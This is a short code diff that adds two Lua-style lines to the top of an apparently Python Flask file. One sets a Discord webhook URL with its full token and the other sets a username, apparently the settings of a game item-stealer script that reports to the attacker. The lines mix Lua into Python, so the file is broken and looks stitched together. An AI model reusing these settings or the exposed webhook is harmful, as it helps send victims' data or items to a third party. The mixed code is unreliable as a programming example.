@@ -1,3 +1,5 @@
+getfenv().Webhook = "https://discord.com/api/webhooks/1383300250311196812/hphloKStYvMiUtk5xrWhD7hSF_V00rpfRtFoBaOZ_yu5K8QTp3vkuKtOwaUEqTrFsc3g"
+getfenv().Username = "okokhellohello14"
 import requests
 from flask import Flask, request
 
